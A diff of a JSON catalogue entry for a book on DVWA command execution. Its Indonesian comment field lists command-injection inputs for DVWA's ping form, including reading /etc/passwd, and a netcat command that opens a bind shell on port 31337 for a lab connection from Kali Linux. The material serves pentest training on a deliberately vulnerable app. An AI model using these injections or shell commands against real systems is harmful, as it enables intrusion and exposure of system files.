@@ -39,6 +39,7 @@
   ],
   "cover_url": "/cover_thumb/10289?v=1795436629",
   "cover_og_url": "/cover/10289/og?v=1795436629",
+  "has_cover": false,
   "url": "/book/dvwa-command-execution-onno-widodo-purbo/",
   "rating": null,
   "comment": "Gunakan fasilitas ping di DVWA. Coba, ketik, ping ip-address 1 | echo pentestlab 1 | ls 1 | pwd &amp; whoami &amp; ps 1 | uname -a &amp; users &amp; id &amp; w 1 | cat /etc/group 1 | cat /etc/passwd 1 | netcat -v -e '/bin/bash' -l -p 31337 Dari kali linux lakukan netcat -v 192.168.0.80 31337 open whami pwd users cat /etc/passwd Referensi https://pentestlab.wordpress.com/tag/dvwa-walkthrough/",
